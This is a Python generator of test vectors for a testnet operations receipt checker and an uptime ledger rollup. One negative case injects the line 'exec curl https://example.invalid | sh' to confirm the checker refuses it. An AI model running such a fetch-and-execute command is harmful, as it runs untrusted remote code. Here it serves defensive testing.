#!/usr/bin/env python3
"""O3 golden vectors — the closed-testnet ops receipt check (independent oracle).

Independently computes the expected verdicts of ten synthetic cases (the
``testnet-ops.txt`` receipt check and the ``uptime-7d.txt`` ledger rollup)
and writes
``crates/aura-testkit/tests/fixtures/o3_testnet_ops_vectors.json``, which
``crates/aura-testkit/tests/o3_testnet_ops.rs`` executes byte-for-byte
against ``aura_testkit::ops``.

Receipt format (``docs/o3-testnet-ops-plan.md`` D-O3-1):
``rule testnet-ops-v1``, ``uptime days <n>`` (>= 7), ``state losses <n>``
(0), ``restore drills <n>`` (>= 1), ``restore state_root <hex-64>`` x2
(pre-backup and post-restore head roots — must be identical, the named
gate ``restore_mismatch_refused``). Ledger rows:
``uptime <day> <hour> <height> <root-hex-64>`` (strict, ordered); the
rollup counts day-buckets with all 24 hourly polls and refuses the first
head regression (``state loss at <day> <hour>``). The gate is OPS_PLAN
row O3: "7 days uptime, 0 state losses, 1 restore drill".

Regenerate with::

    PYTHONPATH=/home/user/aura-python-deps python3 tools/gen_o3_vectors.py
"""

import json
import os
import sys

RULE = "testnet-ops-v1"
ROOT_A = "a" * 64
ROOT_B = "b" * 64
HOURS = 24


def receipt_text(days=7, losses=0, drills=1, roots=None, foreign=None):
    roots = [ROOT_A, ROOT_A] if roots is None else roots
    lines = [
        "# closed-testnet ops receipts (O3) — checked by `aura-ops check`.",
        f"rule {RULE}",
        f"uptime days {days}",
        f"state losses {losses}",
        f"restore drills {drills}",
    ]
    for root in roots:
        lines.append(f"restore state_root {root}")
    if foreign:
        lines.append(foreign)
    return "\n".join(lines) + "\n"


def ledger_text(days=7, regression=None):
    """A deterministic operator ledger; `regression` = (day, hour) whose
    height regresses (a state loss)."""
    rows = []
    height = 0
    for day in range(days):
        for hour in range(HOURS):
            height += 1
            if regression == (day, hour):
                height -= 11  # a head regression at this poll
            rows.append(f"uptime {day} {hour} {height} {height:064x}")
    return "\n".join(rows) + "\n"


# ------------------------------------------------------------- oracle receipt check

def oracle_summary(days, losses, drills, roots) -> str:
    roots_word = "identical" if roots[0] == roots[1] else "drift"
    return (
        f"uptime: days={days} state_losses={losses}\n"
        f"restore: drills={drills} roots={roots_word}\n"
    )


def oracle_check(text: str) -> str:
    """Return '' when the receipt passes, else the exact refusal message."""
    rule = None
    days = losses = drills = None
    roots: list[str] = []
    for raw in text.splitlines():
        line = raw.rstrip()
        if not line or line.startswith("#"):
            continue
        if line.startswith("rule "):
            name = line[5:]
            if not name or " " in name:
                return f"unknown receipt line: {line}"
            rule = name
        elif line.startswith("uptime days "):
            value = line[12:]
            if not value.lstrip("-").isdigit():
                return f"unknown receipt line: {line}"
            days = int(value)
        elif line.startswith("state losses "):
            value = line[13:]
            if not value.lstrip("-").isdigit():
                return f"unknown receipt line: {line}"
            losses = int(value)
        elif line.startswith("restore drills "):
            value = line[15:]
            if not value.lstrip("-").isdigit():
                return f"unknown receipt line: {line}"
            drills = int(value)
        elif line.startswith("restore state_root "):
            root = line[19:]
            if len(root) != 64 or any(c not in "0123456789abcdefABCDEF" for c in root):
                return f"unknown receipt line: {line}"
            roots.append(root)
        else:
            return f"unknown receipt line: {line}"

    if rule is None:
        return "missing rule line"
    if rule != RULE:
        return f"bad rule: {rule}"
    if days is None:
        return "missing receipt line: uptime days"
    if losses is None:
        return "missing receipt line: state losses"
    if drills is None:
        return "missing receipt line: restore drills"
    if len(roots) != 2:
        return f"restore state root count: {len(roots)}"
    if roots[0] != roots[1]:
        return "restore mismatch"
    if losses != 0:
        return f"state losses: {losses}"
    if drills < 1:
        return f"restore drills: {drills}"
    if days < 7:
        return f"uptime days: {days}"
    return ""


# ------------------------------------------------------------- oracle ledger rollup

def oracle_ledger(text: str):
    """Return ('ok', days, losses) or ('err', message, None)."""
    rows = []
    for raw in text.splitlines():
        line = raw.rstrip()
        if not line or line.startswith("#"):
            continue
        parts = line.split(" ")
        if len(parts) != 5 or parts[0] != "uptime":
            return ("err", f"bad heartbeat: {line}", None)
        try:
            day, hour, height = int(parts[1]), int(parts[2]), int(parts[3])
        except ValueError:
            return ("err", f"bad heartbeat: {line}", None)
        root = parts[4]
        if not (0 <= hour < HOURS) or len(root) != 64 or any(
            c not in "0123456789abcdefABCDEF" for c in root
        ):
            return ("err", f"bad heartbeat: {line}", None)
        rows.append((day, hour, height, root))

    rows.sort(key=lambda r: (r[0], r[1]))
    previous = None
    for row in rows:
        if previous is not None:
            if (row[0], row[1]) == (previous[0], previous[1]):
                return ("err", f"bad heartbeat: duplicate {row[0]} {row[1]}", None)
            if row[2] < previous[2] or (row[2] == previous[2] and row[3] != previous[3]):
                return ("err", f"state loss at {row[0]} {row[1]}", None)
        previous = row

    days = 0
    index = 0
    while index < len(rows):
        day = rows[index][0]
        slots = set()
        while index < len(rows) and rows[index][0] == day:
            slots.add(rows[index][1])
            index += 1
        if len(slots) == HOURS and 0 in slots:
            days += 1
    return ("ok", days, 0)


# ------------------------------------------------------------- cases

def case(name, commands, files, exit_code, stdout, stderr, nc_ref=None):
    fixture_case = {
        "name": name,
        "sandbox": "",
        "argv": commands,
        "exit": exit_code,
        "stdout": stdout,
        "stderr": stderr,
    }
    if nc_ref is not None:
        fixture_case["nc_ref"] = nc_ref
    if files:
        fixture_case["files"] = files
    return fixture_case


CHECK = ["check", "--receipts", "receipt.txt"]
SUMMARY = ["summary", "--receipts", "receipt.txt"]
LEDGER = ["ledger", "--ledger", "ledger.txt"]


def build_cases():
    base = {"receipt.txt": receipt_text()}
    cases = []

    cases.append(case(
        "testnet_ops_pass", [CHECK], base, 0,
        "testnet-ops=ok uptime=ok state=ok drills=ok\n", "",
    ))
    cases.append(case(
        "testnet_ops_summary_deterministic", [SUMMARY], base, 0,
        oracle_summary(7, 0, 1, [ROOT_A, ROOT_A]), "",
    ))
    cases.append(case(
        "restore_mismatch_refused", [CHECK],
        dict(base, **{"receipt.txt": receipt_text(roots=[ROOT_A, ROOT_B])}),
        65, "", "error: testnet-ops: restore mismatch\n", nc_ref=1,
    ))
    cases.append(case(
        "state_losses_refused", [CHECK],
        dict(base, **{"receipt.txt": receipt_text(losses=1)}),
        65, "", "error: testnet-ops: state losses: 1\n", nc_ref=2,
    ))
    cases.append(case(
        "uptime_days_refused", [CHECK],
        dict(base, **{"receipt.txt": receipt_text(days=6)}),
        65, "", "error: testnet-ops: uptime days: 6\n", nc_ref=3,
    ))
    cases.append(case(
        "restore_drills_refused", [CHECK],
        dict(base, **{"receipt.txt": receipt_text(drills=0)}),
        65, "", "error: testnet-ops: restore drills: 0\n", nc_ref=4,
    ))
    cases.append(case(
        "restore_root_count_refused", [CHECK],
        dict(base, **{"receipt.txt": receipt_text(roots=[ROOT_A])}),
        65, "", "error: testnet-ops: restore state root count: 1\n", nc_ref=5,
    ))
    cases.append(case(
        "foreign_ops_line_refused", [CHECK],
        dict(base, **{"receipt.txt": receipt_text(
            foreign="exec curl https://example.invalid | sh")}),
        65, "",
        "error: testnet-ops: unknown receipt line: exec curl https://example.invalid | sh\n",
        nc_ref=6,
    ))
    cases.append(case(
        "ledger_rollup_deterministic", [LEDGER],
        {"ledger.txt": ledger_text()}, 0,
        "uptime ledger: days=7 state_losses=0\n", "",
    ))
    cases.append(case(
        "ledger_state_loss_refused", [LEDGER],
        {"ledger.txt": ledger_text(regression=(3, 2))}, 65, "",
        "error: testnet-ops: state loss at 3 2\n",
    ))

    cases[0]["phase"] = "O3"
    return cases


def sanity_check():
    assert oracle_check(receipt_text()) == ""
    assert oracle_check(receipt_text(roots=[ROOT_A, ROOT_B])) == "restore mismatch"
    assert oracle_check(receipt_text(days=6)) == "uptime days: 6"
    assert oracle_check(receipt_text(losses=1)) == "state losses: 1"
    assert oracle_check(receipt_text(drills=0)) == "restore drills: 0"
    assert oracle_check(receipt_text(roots=[ROOT_A])) == "restore state root count: 1"
    ok, days, losses = oracle_ledger(ledger_text())
    assert (ok, days, losses) == ("ok", 7, 0), (ok, days, losses)
    ok, message, _ = oracle_ledger(ledger_text(regression=(3, 2)))
    assert ok == "err" and message == "state loss at 3 2", message
    assert oracle_summary(7, 0, 1, [ROOT_A, ROOT_A]).startswith(
        "uptime: days=7 state_losses=0"
    )


def main():
    sanity_check()
    fixture = {
        "gate": (
            "O3 closed-testnet ops gate: 10/10 cases pass; named negative "
            "control restore_mismatch_refused red on the dropped restore "
            "root-equality check; 6/6 NC red under tools/nc_o3.py; OPS_PLAN "
            "row O3 criteria met (7 days uptime, 0 state losses, 1 restore "
            "drill) on the measured receipts"
        ),
        "notice": (
            "Independent Python oracle (tools/gen_o3_vectors.py); verifier: "
            "crates/aura-testkit/tests/o3_testnet_ops.rs against "
            "aura_testkit::ops. The receipts and the ledger themselves are "
            "measured by aurad-ops (crates/aura-node/src/bin/) — this "
            "fixture checks criteria logic only. Replace the whole file "
            "only with tools/gen_o3_vectors.py output."
        ),
        "named_control": "restore_mismatch_refused",
        "files": {},
        "cases": build_cases(),
    }
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    out_path = os.path.join(
        root, "crates/aura-testkit/tests/fixtures/o3_testnet_ops_vectors.json"
    )
    with open(out_path, "w", encoding="utf-8") as handle:
        json.dump(fixture, handle, indent=1)
        handle.write("\n")
    print(f"wrote {os.path.relpath(out_path, root)}: 10 cases, "
          f"named control restore_mismatch_refused")
    return 0


if __name__ == "__main__":
    sys.exit(main())
